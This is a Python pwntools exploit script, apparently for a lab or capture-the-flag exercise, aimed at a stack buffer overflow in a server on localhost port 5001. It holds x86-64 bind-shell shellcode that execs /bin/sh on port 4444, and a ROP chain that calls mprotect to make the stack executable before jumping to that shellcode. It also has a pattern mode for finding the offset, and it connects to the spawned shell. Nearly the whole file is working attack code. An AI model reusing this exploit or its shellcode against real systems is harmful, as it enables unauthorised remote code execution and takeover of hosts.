#!/usr/bin/python3

import time
import struct
import sys
import argparse
from pwn import *

# http://shell-storm.org/shellcode/files/shellcode-78.php
shellcode = b""
shellcode += b"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
shellcode += b"\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
shellcode += b"\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
shellcode += b"\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
shellcode += b"\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
shellcode += b"\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
shellcode += b"\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
shellcode += b"\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";


gdbStr = '''
set follow-fork-mode child
{}
continue
'''

def main():
    print("Dont forget to start the server in the background")
    context.update(arch='amd64', os='linux')

    parser = argparse.ArgumentParser()
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument("--address", type=str)
    parser.add_argument("--keep", default=False, action='store_true')
    parser.add_argument("--gdb", nargs='?', default="", type=str)
    args = parser.parse_args()

    io = remote("localhost", 5001)
    gdb.attach(io, gdbStr.format(args.gdb))

    if args.address is None:
        print("--[ Send pattern")
        pattern = makePattern(args.offset)
        print(hexdump(pattern, skip=False))

        io.sendafter(b"Data: ", pattern)
        io.recvall()

        return

    else:
        print("--[ Send exploit")
        exploit = makeExploit(args.offset, int(args.address, 16), buf_size=256)
        print(hexdump(exploit, skip=False))

        io.sendafter(b"Data: ", exploit)
        if args.keep:
            io.recvall()
        checkShell()
        return


def makePattern(offset):
    pattern = b'XXXX'
    pattern += b'A' * (offset - 4)
    pattern += b'BBBB' # RIP
    return pattern


def makeExploit(offset, address, buf_size=128, nop=b'\x90'):
    alignedAddr = (address & ~(4096-1));

    exploit = nop * (buf_size - len(shellcode))
    exploit += shellcode
    exploit += b'A' * (offset - len(exploit))

    # next 8 bytes in exploit point on SIP

    exploit += p64 ( 0x446ef3 )         # 0x446ef3: pop rax; ret;
    exploit += p64 ( 10 )               # syscall sys_mprotect

    exploit += p64 ( 0x40178e )         # 0x40178e: pop rdi; ret;
    exploit += p64 ( alignedAddr )      # mprotect arg: addr

    exploit += p64 ( 0x4078be )         # 0x4078be: pop rsi; ret;
    exploit += p64 ( 4096 )             # mprotect arg: size

    exploit += p64 ( 0x4016ab )         # 0x4016ab: pop rdx; ret;
    exploit += p64 ( 0x7 )              # protect arg: permissions

    exploit += p64 ( 0x4150cc )         # 0x40120b: syscall; ret

    exploit += p64 ( address )  # continue here, at shellcode

    return exploit


def checkShell():
    time.sleep(0.5)
    try:
        ioShell = remote("127.0.0.1", 4444)
        ioShell.interactive()
    except Exception as e:
        print("Error: Remote shell not started.")
        pass


if __name__ == '__main__':
        main()
